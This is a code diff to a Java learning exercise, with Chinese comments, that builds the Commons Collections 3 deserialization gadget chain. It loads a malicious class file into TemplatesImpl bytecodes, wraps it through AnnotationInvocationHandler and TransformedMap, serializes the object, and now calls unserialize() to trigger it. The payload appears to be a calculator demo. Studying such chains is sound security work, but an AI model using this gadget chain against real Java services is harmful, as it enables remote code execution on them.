@@ -19,13 +19,17 @@ import java.nio.file.Paths;
 import java.util.HashMap;
 import java.util.Map;
 
+import static utils.ReflectUtils.setFieldValue;
+import static utils.SerializeUtils.serialize;
+import static utils.SerializeUtils.unserialize;
+
 public class CC3 {
     public static void main(String[] args) throws Exception{
         TemplatesImpl templates = new TemplatesImpl();
         //设置变量，确保函数流程走通
         setFieldValue(templates,"_name","Jasper");
         //code是要传的恶意代码
-        byte[] code = Files.readAllBytes(Paths.get("D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class"));
+        byte[] code = Files.readAllBytes(Paths.get("/Users/jasper/Documents/Security/JavaSec/CC/target/classes/pojo/Calc.class"));
         byte[][] codes = {code};
         setFieldValue(templates,"_bytecodes",codes);
         //_tfactory在反序列化的时候会自己赋值，但是如果想调用触发函数templates.newTransformer()看一眼效果，就要设置_tfactory
@@ -51,30 +55,6 @@ public class CC3 {
         aihConstructor.setAccessible(true);
         Object o = aihConstructor.newInstance(Target.class,transformedMap);
         serialize(o);
-        //unserialize();
-    }
-    public static void serialize(Object o) throws Exception{
-        FileOutputStream fos = new FileOutputStream("object.ser");
-        ObjectOutputStream os = new ObjectOutputStream(fos);
-        os.writeObject(o);
-
-        System.out.println("序列化完成...");
-    }
-
-    public static void unserialize() throws Exception{
-        FileInputStream fis = new FileInputStream("object.ser");
-        ObjectInputStream ois = new ObjectInputStream(fis);
-        //反序列化执行readObject()方法
-        Object o =  ois.readObject();
-        ois.close();
-        fis.close();
-
-        System.out.println("反序列化完成...");
-    }
-
-    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
-        Field field = obj.getClass().getDeclaredField(fieldName);
-        field.setAccessible(true);
-        field.set(obj, value);
+        unserialize();
     }
 }
